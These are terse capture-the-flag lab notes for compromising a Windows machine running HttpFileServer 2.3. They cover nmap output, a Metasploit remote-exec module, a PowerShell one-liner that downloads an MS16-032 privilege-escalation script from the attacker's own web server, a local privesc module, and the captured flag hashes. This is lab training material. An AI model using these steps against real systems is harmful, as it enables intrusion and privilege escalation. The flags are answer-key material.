### [ENUMERATION]
     nmap -vvvvv -A -sVT 10.10.10.8 -Pn

    PORT   STATE SERVICE REASON  VERSION
    80/tcp open  http    syn-ack HttpFileServer httpd 2.3
    |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-server-header: HFS 2.3
    |_http-title: HFS /
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

### [EXPLOIT]
      search for httpfileserver 2.3 on metasploit 
      exploit(windows/http/rejetto_hfs_exec) 
      set options and we're in
      OS Name:                   Microsoft Windows Server 2012 R2 Standard

      From meterpreter sessions we can see the user.txt.txt file and grab the hash
      whoami
      optimum\kostas
      administrator access is denied so we need to priv esc 

### [PRIV ESC]
      #Google says MS16-032 so we're gonna use server 2012 R2 exploit and pull a file off local http server

      powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.19:8000/MS16-032.ps1', 'c:\Users\Public\Downloads\yeet.ps1')"
      #was not able to execute 


      #When looking for MS16-032 I found a metasploit module named 
      windows/local/ms16_032_secondary_logon_handle_privesc
      #Set the target to the version associated with the tasklist command which was x64
      #changed the lport/lhost to match and a root shell was obtained


### [HASH]
    d0c39409d7b994a9a1389ebf38ef5f73 C:\users\kostas\Desktop\user.txt.txt
    51ed1b36553c8461f4552c2e92b3eeed C:\users\administrator\root.txt
